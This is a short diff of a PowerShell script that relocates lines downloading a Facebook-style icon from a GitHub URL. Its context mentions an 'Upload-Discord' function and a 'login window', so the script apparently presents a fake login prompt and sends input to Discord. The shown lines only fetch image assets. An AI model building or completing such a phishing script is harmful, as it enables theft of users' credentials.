@@ -1,9 +1,3 @@
-# Define the URL to the icon hosted on GitHub
-$iconUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/fb.ico"
-$iconFilePath = Join-Path $env:TEMP "custom_icon.ico"
-
-# Download the icon from GitHub
-Invoke-WebRequest -Uri $iconUrl -OutFile $iconFilePath
 # Define the Upload-Discord function
 
 
@@ -92,7 +86,12 @@ Write-Host "The user clicked: $Result"
 
 # Define the URL to the image hosted on GitHub
 $imageUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/fb.jpg"
+# Define the URL to the icon hosted on GitHub
+$iconUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/fb.ico"
+$iconFilePath = Join-Path $env:TEMP "custom_icon.ico"
 
+# Download the icon from GitHub
+Invoke-WebRequest -Uri $iconUrl -OutFile $iconFilePath
 # Create XAML for the login window
 $XAML = @"
 <Window
